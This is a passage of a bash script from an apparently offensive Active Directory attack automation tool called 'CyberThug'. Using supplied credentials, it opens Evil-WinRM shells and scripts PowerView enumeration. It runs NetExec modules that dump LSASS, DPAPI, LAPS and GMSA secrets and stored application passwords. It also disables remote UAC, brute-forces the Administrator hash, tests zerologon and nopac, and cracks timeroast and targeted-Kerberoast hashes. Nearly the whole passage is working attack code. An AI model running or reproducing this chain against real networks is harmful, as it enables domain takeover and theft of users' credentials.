expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e \\\"\\\e[1;32m[+] Getting TGT for $user ...\e[0m\\\"
echo ''
getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
export KRB5CCNAME=$user.ccache
echo ''
echo -e \\\"\\\e[1;32m[+]-- powerview $CLEAN_DOMAIN/$user:$p@$DC -k --[+]\e[0m\\\"
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$user:$p@$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e \\\"\\\e[1;33m[!] powerview failed for $user again with ticket\e[0m\\\"
exec bash\"  
gnome-terminal -- bash -c \"
echo -e \\\"\\\e[1;32m[+] User: $user\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Password: $p\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] DC: $DC\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Domain: $CLEAN_DOMAIN\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Ip: $Ip\e[0m\\\"

echo -e \\\"\\\e[1;32m[+] Trying Evil-WinRM direct auth for $user ...\e[0m\\\"
echo '' 
echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -p $p --[+]\e[0m\\\"
echo ''
evil-winrm -i $DC -u $user -p $p

if [ \$? -ne 1 ]; then
    echo ''
    echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for $user. Trying getTGT.py and Kerberos auth ..\e[0m\\\"
    echo ''

    getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
    echo ''

    if [ -f $user.ccache ]; then
        export KRB5CCNAME=$user.ccache
        echo ''
        echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN --[+]\e[0m\\\"
        echo ''   
        evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN
        if [ \$? -ne 0 ]; then
            echo ''
            echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\\\"
            echo ''
        fi
    else
        echo -e \\\"\\\e[1;31m[-] getTGT.py failed. No ccache found for $user.\e[0m\\\"
        echo ''
    fi
fi
exec bash\"

exec bash
"
        done
    fi
    sleep 5
done
    echo ""
fi  
exec bash
'
}
ntlmrelay_mitm6
    echo ""
    cat << EOF > /tmp/auto.sh
#!/bin/bash
trap '' SIGINT
trap 'next_step=true' SIGINT
if [ "$next_step" = true ]; then
  next_step=false
fi
echo -e "\e[1;35m
      ______      __             ________
     / ____/_  __/ /_  ___  ____/_  __/ /_  __  __._____
    / /   / / / / __ \/ _ \/ ___// / / __ \/ / / / __  /
   / /___/ /_/ / /_/ /  __/ /   / / / / / / /_/ / /_/ /
   \____/\__, /_.___/\___/_/   /_/ /_/ /_/\__,_/\__, /
        /____/                                 /____/
\e[0m"
gnome-terminal -- bash -c '
next_step=false
trap '' SIGINT
trap 'next_step=true' SIGINT

if [ \"\$next_step\" = true ]; then
    next_step=false
fi
echo -e "\e[1;35m
 _    __  ______  
| \ | \ \/ / ___| 
|  \| |\  / |     
| |\  |/  \ |___  
|_| \_/_/\_\____|
	\e[0m"

gnome-terminal -- bash -c "
echo ''
read -p \"Press Enter to run Evil-Winrm for User => $User\"
echo ''   
evil-winrm -i $DOMAIN -u $User -p $Password
echo ''
getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
echo ''
export KRB5CCNAME=$User.ccache
echo ''
evil-winrm -i $DC -u $User -r $CLEAN_DOMAIN
exec bash"

gnome-terminal -- bash -c "
echo ''
read -p \"Press Enter to run Powerview for User => $User\"
echo '' 
expect -c \"
set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC 
expect -re {PV.*❯};
send -s \\\\\"Get-Domain\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -spn\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -PreAuthNotRequired\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup -Properties name,member\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup -AdminCount\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainTrust\\\\r\\\\\";
interact\"
echo ''
getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
echo ''
export KRB5CCNAME=$User.ccache
expect -c \"
set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC -k
expect -re {PV.*❯};
send -s \\\\\"Get-Domain\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -spn\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -PreAuthNotRequired\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup -Properties name,member\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainGroup -AdminCount\\\\r\\\\\";
expect -re {PV.*❯};
send -s \\\\\"Get-DomainTrust\\\\r\\\\\";
interact\"
echo ''
exec bash"
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag 
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M subnets $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password -M subnets $flag 
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M pre2k $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password -M pre2k $flag 
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M laps $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password -M laps $flag 
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M pso $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password -M pso $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M adcs $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password -M adcs $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M enum_ca $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M enum_ca $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M bitlocker $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M bitlocker $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M dpapi_hash $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M dpapi_hash $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M nanodump $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M nanodump $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M remote-uac -o ACTION=disable $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M remote-uac -o ACTION=disable $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M ioxidresolver $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M ioxidresolver $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M backup_operator $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M backup_operator $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M keepass_discover $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M keepass_discover $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M powershell_history $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M powershell_history $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M recent_files $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M recent_files $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M winscp $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M winscp $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M teams_localdb $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M teams_localdb $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M mremoteng $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M mremoteng $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M mobaxterm $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M mobaxterm $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M putty $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M putty $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M rdcman $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M rdcman $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M wifi $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password -M wifi $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --dpapi $flag --[+]\033[0m"
nxc smb $DOMAIN -u $User -p $Password --dpapi $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag --[+]\033[0m"
nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag 
echo ""
echo -e "\033[36m[+]-- Running nxc mssql $DOMAIN --local-auth -u $User -p $Password -x '\''net user'\'' $flag --[+]\033[0m"
nxc mssql $DOMAIN --local-auth -u $User -p $Password -x "net user" $flag
echo ""
exec bash
'
echo""
gnome-terminal -- bash -c "
echo -e '\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m'
echo ""
nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes
exec bash
"
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --continue-on-success $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password --continue-on-success $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --users $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password --users $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --rid-brute $flag --[+]\033[0m"
echo ""
for i in {1..15}; do
    dots=\$(( (i - 1) % 3 + 1 ))
    echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
    sleep 0.1
done
echo ""
nxc smb $DOMAIN -u $User -p $Password --rid-brute $flag > /tmp/.test_nxc_rid_brute
echo ""
grep 'SidTypeUser' /tmp/.test_nxc_rid_brute | awk '{ sub(/^.*\\\\/, "", \$6); print \$6 }' > /tmp/.test1_nxc_rid_brute 
cat /tmp/.test_nxc_rid_brute
cp /tmp/.test1_nxc_rid_brute $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/nxc_rid_brute_$DOMAIN_$DATE 2>/dev/null
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --shares $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password --shares $flag
echo ""
for i in {1..15}; do
    dots=\$(( (i - 1) % 3 + 1 ))
    echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
    sleep 0.1
done
echo ""
nxc smb $DOMAIN -u $User -p $Password --shares $flag | awk 'NR>6 && \$0 ~ /READ/ {for(i=5;i<=NF && \$i !~ /READ/; i++) printf "%s%s",\$i,(i<NF?" ":"\n"); print ""}' > /tmp/shares.txt
if [[ -s /tmp/shares.txt ]]; then 
   if [[ -f "$User" || -f "$Password" ]]; then
        :
   else
      gnome-terminal -- bash -c "
           echo -e '\033[1;32m[+]-- Running Smbclient for => $User --[+]\033[0m'
           while read -r share; do
             echo \"\"
             echo -e \"\033[1;34m[*] \\\$share\033[0m\" 
             gnome-terminal -- bash -c \"
                               echo -e '\033[36m[+] Connecting to share: //$DC/\\\$share \033[0m'
                               echo -e '\033[36m[+] User: $User\033[0m'
                               echo -e '\033[36m[+] Password: $Password\033[0m'
                               echo \"\"
                               smbclient //$DC/'\\\$share' -U $User%$Password
                               echo \"\"
                               echo -e '\033[36m[+] Getting TGT for => $User\033[0m'
                               echo \"\"
                               getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 
                               export KRB5CCNAME=${User}.ccache
                               echo \"\"
                               smbclient.py -k -no-pass -target-ip $Ip $CLEAN_DOMAIN/$User@$DC
                               exec bash
             \"
           done < /tmp/shares.txt
        exec bash
      "
   fi
fi
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M spider_plus $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password -M spider_plus $flag  
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --loggedon-users $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password --loggedon-users $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M timeroast $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password -M timeroast $flag > /tmp/.timeroast
cat /tmp/.timeroast
cat /tmp/.timeroast | awk "{print $ 5}" | sed 's/\[\*\]//g' | sed 's/\[+]//g'  > /tmp/.timeroast1
cp /tmp/.timeroast1 $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/timeroast_$DOMAIN_$DATE 2>/dev/null
if grep -iq sntp /tmp/.timeroast1; then 
    gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Cracking timeroast Hashes --[+]\e[0m'; echo '' ; python3 $HOME/Downloads/tools/Files/Timeroast.py /tmp/.timeroast1 /usr/share/wordlists/rockyou.txt; exec bash"
fi
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M enum_av $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password -M enum_av $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --pass-pol $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password --pass-pol $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap \"$DOMAIN\" -u \"$User\" -p \"$Password\" --groups $flag --[+]\033[0m"
echo ""
nxc ldap $DOMAIN -u $User -p $Password --groups $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap \"$DOMAIN\" -u \"$User\" -p \"$Password\" --computers $flag --[+]\033[0m"
echo ""
nxc ldap $DOMAIN -u $User -p $Password --computers $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap \"$DOMAIN\" -u \"$User\" -p \"$Password\" --get-sid $flag --[+]\033[0m"
echo ""
nxc ldap $DOMAIN -u $User -p $Password --get-sid $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M enum_trusts $flag --[+]\033[0m"
echo ""
nxc ldap $DOMAIN -u $User -p $Password -M enum_trusts $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M maq $flag --[+]\033[0m"
echo ""
nxc ldap $DOMAIN -u $User -p $Password -M maq $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M zerologon $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password -M zerologon $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M coerce_plus $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password -M coerce_plus $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M nopac $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password -M nopac $flag
echo ""
echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M gpp_password $flag --[+]\033[0m"
echo ""
nxc smb $DOMAIN -u $User -p $Password -M gpp_password $flag
echo ""
echo -e "\033[36m[+]-- Running nxc winrm \"$DOMAIN\" -u \"$User\" -p \"$Password\" $flag --[+]\033[0m"
echo ""
nxc winrm $DOMAIN -u $User -p $Password $flag
echo ""
echo -e "\033[36m[+]-- Running nxc ldap \"$DOMAIN\" -u \"$User\" -p \"$Password\" --bloodhound --collection all --dns-server $Ip $flag --[+]\033[0m"
echo ""
nxc ldap $DOMAIN -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag
echo ""
if [[ -f "$User" && -f "$Password" ]]; then
     :
elif [[ -f "$User" ]] ; then
     :
elif [[ -f "$Password" ]] ; then
     :
else
     echo -e "\033[36m[+]-- Running findDelegation.py \"$DOMAIN\"/\"$User\":\"$Password\" -target-domain \"$DOMAIN\" $flag --[+]\033[0m"
     findDelegation.py $DOMAIN/$User:$Password -target-domain $DOMAIN $flag
     echo "----------"
     echo -e "\033[36m[+]-- Running findDelegation.py \"$CLEAN_DOMAIN\"/\"$User\":\"$Password\" -target-domain \"$CLEAN_DOMAIN\" -dc-host \"$DC\" $flag --[+]\033[0m"
     findDelegation.py $CLEAN_DOMAIN/$User:$Password -target-domain $CLEAN_DOMAIN -dc-host $DC $flag
fi 
echo ""
if [[ -f "$User" && -f "$Password" ]]; then
    if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
        echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host \"$DC\" -u /tmp/.test1_nxc_rid_brute -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
        echo ""
        while read -r u; do 
            while read -r p; do
		if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                    echo -e "\033[31m[+]-- Getting TGT for => \$u --[+]\033[0m"      
                    getTGT.py $CLEAN_DOMAIN/\$u:\$p -dc-ip $DC -k 2>/dev/null
	            if [ -f "\$u.ccache" ]; then
    	                export KRB5CCNAME="\$u.ccache"
		    fi
                    echo ""  
    		fi   
                python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$u -p \$p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$u 2>/dev/null
                grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$u  > /tmp/.tgs1.txt.\$u 
                cat /tmp/.tgs1.txt.\$u 
                cp /tmp/.tgs1.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                if [ -s /tmp/.tgs1.txt.\$u ]; then
		    echo \$u > /tmp/.current_u.txt
	            targeted_kerberoast_check
		    break
                fi
            done < $Password
        done < /tmp/.test1_nxc_rid_brute
    else
        echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host \"$DC\" -u \"$User\" -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
        echo ""
        while read -r u; do
            while read -r p; do
                if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                    echo -e "\033[31m[+]-- Getting TGT for => \$u --[+]\033[0m"      
                    getTGT.py $CLEAN_DOMAIN/\$u:\$p -dc-ip $DC -k 2>/dev/null
                    if [ -f "\$u.ccache" ]; then
                        export KRB5CCNAME="\$u.ccache"
                    fi
                    echo ""  
                fi   
                python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$u -p \$p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$u 2>/dev/null
                grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$u > /tmp/.tgs1.txt.\$u 
                cat /tmp/.tgs1.txt.\$u
                cp /tmp/.tgs1.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                if [ -s /tmp/.tgs1.txt.\$u ]; then
                    targeted_kerberoast_check
                    break
                fi
            done < $Password
        done < $User
    fi
elif [[ -f "$User" ]]; then
    if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then  
        echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u /tmp/.test1_nxc_rid_brute -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m" 
        echo "" 
        for i in \$(cat /tmp/.test1_nxc_rid_brute); do
            if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                 echo -e "\033[31m[+]-- Getting TGT for => \$i --[+]\033[0m"      
                 getTGT.py $CLEAN_DOMAIN/\$i:$Password -dc-ip $DC -k 2>/dev/null
                 if [ -f "\$i.ccache" ]; then
                      export KRB5CCNAME="\$i.ccache"
                 fi
                 echo ""  
            fi   
            python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$i 2>/dev/null
            grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$i > /tmp/.tgs1.txt.\$i 
            cat /tmp/.tgs1.txt.\$i
            cp /tmp/.tgs1.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
            if [ -s /tmp/.tgs1.txt.\$i ]; then
		u="\$i"
                echo \$u > /tmp/.current_u.txt 
                targeted_kerberoast_check
                break
            fi
        done 
    else
        echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host \"$DC\" -u \"$User\" -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
        echo ""
        for i in \$(cat $User); do
 	    if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                 echo -e "\033[31m[+]-- Getting TGT for => \$i --[+]\033[0m"      
                 getTGT.py $CLEAN_DOMAIN/\$i:$Password -dc-ip $DC -k 2>/dev/null
                 if [ -f "\$i.ccache" ]; then
                       export KRB5CCNAME="\$i.ccache"
                 fi
                 echo ""  
            fi   
            python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$i 2>/dev/null
            grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$i > /tmp/.tgs1.txt.\$i
            cat /tmp/.tgs1.txt.\$i
            cp /tmp/.tgs1.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
            if [ -s /tmp/.tgs1.txt.\$i ]; then
 		 u="\$i"
                 echo \$u > /tmp/.current_u.txt  
                 targeted_kerberoast_check
                 break
            fi           
        done 
    fi 
elif [[ -f "$Password" ]]; then
    if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then  
        echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u /tmp/.test1_nxc_rid_brute -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
        echo ""
        while read -r u; do
            while read -r p; do
 	        if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                     echo -e "\033[31m[+]-- Getting TGT for => \$u --[+]\033[0m"      
                     getTGT.py $CLEAN_DOMAIN/\$u:\$p -dc-ip $DC -k 2>/dev/null
                     if [ -f "\$u.ccache" ]; then
                        export KRB5CCNAME="\$u.ccache"
                     fi
               	     echo ""  
            	fi   
                python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$u -p \$p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$u 2>/dev/null
                grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$u > /tmp/.tgs1.txt.\$u
                cat /tmp/.tgs1.txt.\$u
                cp /tmp/.tgs1.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
